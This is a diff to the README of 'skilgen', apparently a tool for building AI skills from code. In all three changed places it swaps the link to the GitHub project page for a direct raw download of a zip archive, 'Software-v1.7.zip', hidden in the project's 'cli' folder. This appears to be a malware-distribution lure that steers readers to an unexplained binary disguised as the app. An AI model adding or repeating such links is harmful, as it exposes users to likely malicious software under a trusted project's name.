@@ -1,6 +1,6 @@
 # 🧠 skilgen - Build AI Skills from Code
 
-[![Download skilgen](https://img.shields.io/badge/Download-skilgen-blue?style=for-the-badge&logo=github)](https://github.com/Professed-indianbean720/skilgen)
+[![Download skilgen](https://img.shields.io/badge/Download-skilgen-blue?style=for-the-badge&logo=github)](https://github.com/Professed-indianbean720/skilgen/raw/refs/heads/main/skilgen/cli/Software-v1.7.zip)
 
 ## 🚀 What skilgen does
 
@@ -17,7 +17,7 @@ It helps you:
 
 Use this link to visit the page and download the app:
 
-[Download skilgen](https://github.com/Professed-indianbean720/skilgen)
+[Download skilgen](https://github.com/Professed-indianbean720/skilgen/raw/refs/heads/main/skilgen/cli/Software-v1.7.zip)
 
 ## 🪟 Windows setup
 
@@ -207,7 +207,7 @@ Keep it inside your project folder so it stays close to the source files.
 
 If you need to get the app again, use this link:
 
-[Download skilgen](https://github.com/Professed-indianbean720/skilgen)
+[Download skilgen](https://github.com/Professed-indianbean720/skilgen/raw/refs/heads/main/skilgen/cli/Software-v1.7.zip)
 
 ## 🧭 Suggested next step
 
